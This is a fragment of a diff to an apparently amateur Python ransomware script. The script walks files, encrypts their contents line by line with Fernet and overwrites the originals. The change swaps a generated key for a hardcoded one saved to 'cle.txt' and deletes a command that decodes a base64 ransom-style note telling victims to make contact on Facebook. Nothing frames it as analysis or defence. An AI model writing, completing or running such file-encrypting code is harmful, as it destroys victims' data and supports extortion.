@@ -16,13 +16,15 @@ for xx in x :
                 dada = open(ca, 'r')
                 for xd in dada :
                         xxd = xd
-                        key = Fernet.generate_key()
-                        f = Fernet(key)
+                        
+                        f = Fernet('RHokRnjynEGXSv5VmPNkj-BCaoHnRv2Piznl7t4shgM=')
                         token = f.encrypt(xd)
                         file =open(ca,'w')
-                        file.write(token)
+                        file.write(token) 
+                      
+                        
+                        
+                        
                         
                         cle = open('cle.txt', 'w')
-                        cle.write(key)
-                        
-                        os.system('echo Q29udGFjdGUgeXMgamhvbnNvbiBsZSB3YW5uYSBzdXIgZmFjZWJvb2sgIQ== | base64 -d > message.txt')
+                        cle.write('RHokRnjynEGXSv5VmPNkj-BCaoHnRv2Piznl7t4shgM=')
